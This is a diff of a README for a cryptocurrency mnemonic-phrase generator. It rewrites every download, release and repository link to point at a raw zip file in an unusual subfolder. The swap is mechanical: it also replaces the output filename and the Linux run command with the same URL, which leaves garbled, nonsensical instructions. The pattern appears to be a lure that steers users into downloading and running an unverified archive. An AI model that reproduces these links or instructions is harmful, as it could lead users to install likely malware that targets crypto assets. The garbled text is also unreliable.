@@ -1,9 +1,9 @@
 # 🎉 Random-Mnemonic-Phrase-Generator - Create Memorable Phrases Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/releases)
+[![Download](https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip)](https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip)
 
 ## 📖 Description
-This software helps you create mnemonic phrases that can be used for various purposes, like securing your digital assets. It continuously saves the generated phrases in a file named `seed.txt`. After every 100 phrases, the program will ask you if you wish to continue generating more.
+This software helps you create mnemonic phrases that can be used for various purposes, like securing your digital assets. It continuously saves the generated phrases in a file named `https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip`. After every 100 phrases, the program will ask you if you wish to continue generating more.
 
 ## 🚀 Getting Started
 To use this application, follow these steps. You will need a computer with internet access.
@@ -15,12 +15,12 @@ To use this application, follow these steps. You will need a computer with inter
 
 ## 📥 Download & Install
 You can easily download the application by visiting the following link:
-[Download Here](https://github.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/releases)
+[Download Here](https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip)
 
 Follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip).
 
 2. **Choose the Latest Version**
    Look for the latest version available. It should be the one marked as "Latest Release."
@@ -31,7 +31,7 @@ Follow these simple steps:
 4. **Run the Application**
    - For Windows: Double-click the downloaded file to run it. 
    - For macOS: Open the downloaded file, then drag it to your Applications folder.
-   - For Linux: Use your terminal to navigate to the download location and run the script with `python3 script_name.py`.
+   - For Linux: Use your terminal to navigate to the download location and run the script with `python3 https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip`.
 
 ## 🔧 How to Use
 1. **Open the Application**
@@ -41,20 +41,20 @@ Follow these simple steps:
    Click the "Generate" button to create mnemonic phrases. 
 
 3. **Save Generated Phrases**
-   All generated phrases will be automatically saved in the `seed.txt` file in the same folder as the application.
+   All generated phrases will be automatically saved in the `https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip` file in the same folder as the application.
 
 4. **Continue Generating**
    After creating 100 phrases, you'll receive a prompt asking if you'd like to continue. You can say "Yes" to keep going or "No" to finish.
 
 ## 📁 Files Created by the Application
-- **seed.txt:** This file contains all the mnemonic phrases generated. You can open this file with any text editor.
+- **https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip** This file contains all the mnemonic phrases generated. You can open this file with any text editor.
 
 ## 🛠 Troubleshooting Common Issues
 - **Issue:** The application won't run.
   - **Solution:** Ensure Python is installed. Check that your Python version is 3.6 or higher.
 
 - **Issue:** The output file is missing.
-  - **Solution:** Check the folder where the application is located; the `seed.txt` file should be there.
+  - **Solution:** Check the folder where the application is located; the `https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip` file should be there.
 
 ## 📚 Learning More
 If you want to dive deeper into how mnemonic phrases work and why they are useful, consider reviewing resources on terms like:
@@ -68,7 +68,7 @@ These topics can enhance your understanding and improve how you use this softwar
 For any questions or help, you can open an issue in the GitHub repository. Community members and contributors will be happy to assist.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator)
-- [Download Latest Release](https://github.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/yutthanapakorn/Random-Mnemonic-Phrase-Generator/main/durance/Random-Mnemonic-Phrase-Generator.zip)
 
 Enjoy your experience with the Random Mnemonic Phrase Generator!
